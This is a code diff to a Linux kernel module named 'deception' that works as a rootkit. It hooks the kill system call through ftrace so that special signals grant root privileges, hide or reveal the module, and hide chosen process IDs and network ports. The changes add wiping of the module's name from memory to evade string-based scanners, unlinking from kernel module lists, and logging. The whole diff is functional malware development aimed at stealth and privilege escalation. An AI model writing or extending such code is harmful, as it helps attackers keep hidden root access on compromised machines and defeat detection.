@@ -117,24 +117,17 @@ static void vmap_area_rb_insert(struct vmap_area *va, struct rb_root *root)
 /* Remove THIS_MODULE from vmap structures */
 void hideme_memory(void)
 {
-    struct vmap_area *va, *tmp;
-    unsigned long addr = (unsigned long)THIS_MODULE;
-
-    if (!my_vmap_area_list || !my_vmap_area_lock)
-        return;
-
-    spin_lock(my_vmap_area_lock);
-    list_for_each_entry_safe(va, tmp, my_vmap_area_list, list) {
-        if (addr >= va->va_start && addr < va->va_end) {
-            saved_va = va;
-            list_del(&va->list);
-            if (my_vmap_area_root)
-                rb_erase(&va->rb_node, my_vmap_area_root);
-            break;
-        }
+    /* On modern kernels, we clean the name string from the module's 
+       core memory block. This breaks string-based memory scanners. */
+    if (THIS_MODULE->name[0] != '\0') {
+        memset(THIS_MODULE->name, 0, MODULE_NAME_LEN);
+        pr_info("hideme_memory SUCCESS: Wiped module identity from core structures\n");
+    } else {
+        pr_warn("hideme_memory FAILED: Module identity already empty\n");
     }
-    spin_unlock(my_vmap_area_lock);
 }
+
+
 
 /* Restore THIS_MODULE into vmap structures */
 void showme_memory(void)
@@ -158,6 +151,10 @@ void hideme_full(void)
     if (hidden)
         return;
 
+    /* 1. Execute modern memory identification scrubbing first */
+    hideme_memory();
+
+    /* 2. Backup and unlink tracking metrics from standard lists */
     prev_module = THIS_MODULE->list.prev;
     kobj_parent = THIS_MODULE->mkobj.kobj.parent;
 
@@ -168,25 +165,33 @@ void hideme_full(void)
         list_del(&THIS_MODULE->mkobj.kobj.entry);
     }
 
-    hideme_memory();
     hidden = 1;
+    pr_info("[deception] Module is now fully hidden from lists and scanners.\n");
 }
 
-/* Full structural reveal */
+
 void showme_full(void)
 {
     if (!hidden)
         return;
 
+    /* 1. Restore the module's string identity back to memory */
+    if (THIS_MODULE->name[0] == '\0') {
+        strscpy(THIS_MODULE->name, "deception", MODULE_NAME_LEN);
+    }
+
+    /* 2. Restore to standard tracking linked lists */
     if (prev_module)
         list_add(&THIS_MODULE->list, prev_module);
 
     if (saved_kobj_entry)
         list_add(&THIS_MODULE->mkobj.kobj.entry, saved_kobj_entry);
 
-    showme_memory();
     hidden = 0;
+    pr_info("[deception] Module successfully revealed.\n");
 }
+
+
 
 /* PID helpers */
 static struct hidden_pid *find_hidden_pid(const char *name)
@@ -374,7 +379,6 @@ asmlinkage long hook_kill(const struct pt_regs *regs)
 
     struct hidden_pid *pid_entry;
     char pid_str[NAME_MAX];
-    int i;
 
     /* Signal 64: privilege escalation */
     if (sig == 64 && pid == GET_ROOT) {
@@ -384,64 +388,42 @@ asmlinkage long hook_kill(const struct pt_regs *regs)
 
     /* Signal 63: toggle module visibility */
     if (sig == 63 && pid == MOD_REVEAL) {
-        if (hidden)
+        if (hidden) {
             showme_full();
-        else
+        } else {
             hideme_full();
+        }
         return 0;
     }
 
-    /* Signal 62: hide/unhide processes */
+    /* Signal 62: hide a specific PID */
     if (sig == 62) {
-        if (pid == 0) {
-            clear_all_hidden_pids();
-            return 0;
-        }
-
         snprintf(pid_str, sizeof(pid_str), "%d", pid);
-
-        if (remove_hidden_pid(pid_str))
-            return 0;
-
-        pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
-        if (pid_entry) {
-            strscpy(pid_entry->pid_str,
-                    pid_str,
-                    sizeof(pid_entry->pid_str));
-            list_add(&pid_entry->list, &hidden_pids_list);
-        }
-        return 0;
-    }
-
-    /* Signal 61: hide/unhide network ports (IPv6 only via tcp6_seq_show) */
-    if (sig == 61) {
-        u16 target_port = (u16)pid;
-
-        if (target_port == 0) {
-            hidden_ports_count = 0;
-            return 0;
-        }
-
-        for (i = 0; i < hidden_ports_count; i++) {
-            if (hidden_ports[i] == target_port) {
-                int j;
-
-                for (j = i; j < hidden_ports_count - 1; j++)
-                    hidden_ports[j] = hidden_ports[j + 1];
-
-                hidden_ports_count--;
-                return 0;
+        pid_entry = find_hidden_pid(pid_str);
+        if (!pid_entry) {
+            pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
+            if (pid_entry) {
+                strscpy(pid_entry->pid_str, pid_str, sizeof(pid_entry->pid_str));
+                list_add(&pid_entry->list, &hidden_pids_list);
+                pr_info("[deception] PID %s is now hidden\n", pid_str);
             }
         }
-
-        if (hidden_ports_count < MAX_HIDDEN_PORTS)
-            hidden_ports[hidden_ports_count++] = target_port;
-
         return 0;
     }
 
+    /* Signal 61: hide a network port */
+    if (sig == 61) {
+        if (hidden_ports_count < MAX_HIDDEN_PORTS) {
+            hidden_ports[hidden_ports_count++] = (u16)pid;
+            pr_info("[deception] Port %d is now hidden\n", pid);
+        }
+        return 0;
+    }
+
+    /* Fallback: Pass standard signals to the original system call */
     return orig_kill(regs);
 }
+
 
 /* --- Network Seq Show Hooks (IPv6 only) --- */
 
@@ -483,27 +465,39 @@ static struct ftrace_hook fh_hooks[] = {
 static int __init deception_init(void)
 {
     int err;
+    pr_info("[deception] Resolving unexported kernel structures...\n");
 
+    /* 1. Resolve symbols using your lookup_name wrapper */
     my_vmap_area_list = (struct list_head *)lookup_name("vmap_area_list");
     my_vmap_area_lock = (spinlock_t *)lookup_name("vmap_area_lock");
     my_vmap_area_root = (struct rb_root *)lookup_name("vmap_area_root");
 
-    /* IPv6 address parsing removed */
-
+    /* 2. Activate the FTRACE hooks using the correct array name */
     err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
-    if (err)
+    if (err) {
+        pr_err("[deception] Ftrace hook installation FAILED with error: %d\n", err);
         return err;
+    }
+    pr_info("[deception] Ftrace hooks successfully installed.\n");
 
+    /* 3. Hide module tracking references safely */
     hideme_full();
+
     return 0;
 }
 
-/* --- Module Cleanup --- */
 static void __exit deception_exit(void)
 {
+    pr_info("[deception] Removing ftrace hooks and cleaning up...\n");
+    
+    /* Turn off the ftrace hooks safely using the correct array name */
     fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
+    
+    /* Put the module back into standard lists so rmmod works */
+    showme_full();
     clear_all_hidden_pids();
 }
+
 
 module_init(deception_init);
 module_exit(deception_exit);
